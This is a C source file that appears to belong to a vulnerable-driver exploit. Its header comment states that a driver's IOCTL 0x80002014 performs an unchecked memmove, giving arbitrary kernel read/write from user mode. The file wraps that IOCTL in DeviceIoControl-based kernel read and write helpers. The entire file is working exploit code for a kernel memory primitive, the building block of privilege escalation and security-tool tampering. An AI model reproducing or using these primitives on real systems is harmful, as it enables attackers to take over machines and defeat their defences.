/*
 * driver_io.c — IOCTL 0x80002014 wrappers.
 *
 * The vulnerable driver exposes a memmove primitive: caller supplies
 * (dst, src, size); driver does memmove() with no ProbeForRead/Write,
 * giving arbitrary kernel R/W from user-mode.
 *
 * We use it in two patterns:
 *   1. dst is kernel address, src is user buffer  → kernel write
 *   2. dst is user buffer,   src is kernel address → kernel read
 *
 * Both go through the same PDFW_MEMCPY struct.
 */
#include "common.h"

BOOL drv_kernel_memcpy(HANDLE hDev, PVOID dst, PVOID src, SIZE_T size) {
    PDFW_MEMCPY req = { .dst = dst, .src = src, .size = size };
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(hDev, PDFW_IOCTL_MEMCPY,
                              &req, sizeof(req),
                              NULL, 0,
                              &ret, NULL);
    if (!ok) {
        ERR("DeviceIoControl(0x%x) dst=%p src=%p sz=%zu err=%lu",
            PDFW_IOCTL_MEMCPY, dst, src, size, GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL drv_kernel_read(HANDLE hDev, PVOID kaddr, PVOID user_buf, SIZE_T size) {
    /* memmove(user_buf, kaddr, size) */
    return drv_kernel_memcpy(hDev, user_buf, kaddr, size);
}

BOOL drv_kernel_write(HANDLE hDev, PVOID kaddr, PVOID user_buf, SIZE_T size) {
    /* memmove(kaddr, user_buf, size) */
    return drv_kernel_memcpy(hDev, kaddr, user_buf, size);
}
